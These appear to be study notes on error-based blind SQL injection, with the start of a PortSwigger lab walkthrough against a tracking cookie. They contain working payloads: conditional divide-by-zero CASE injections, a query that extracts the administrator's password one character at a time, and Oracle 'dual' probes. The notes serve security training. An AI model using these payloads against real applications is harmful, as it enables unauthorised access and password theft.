## Error-based SQL injection
- where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.
- The possibilities depend largely on the configuration of the database and the types of errors you're able to trigger.

### Exploiting blind SQL injection by triggering conditional errors
- Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.
- This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false

- To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
```
- These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true.
- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. 
- Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

- Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

## Steps to solve Lab-1
### Desc - Blind SQL injection with conditional errors
### Pre-requisite - [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

1. First confirm that the parameter(tracking-id) is vulnerable to blind SQLi
Vulnerable parameter - tracking cookie(tracking-id)
**Below is how the backend query looks like when it checks the user is known or not known** ->
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8'
```

**Note** - If the SQL query causes an error, then the application returns a custom error message.

2. Now, we need to check the version of the database used:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '') || '
```

Below performing on burp:
![[blind_SQL_injection_conditional_errors1.png]]
- We need to use "FROM" keyword along with the oracle built-in table which is "dual"

query - 
```sql 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM dual) || '
```

Below performing on burp:
![[blind_SQL_injection_conditional_errors2.png]]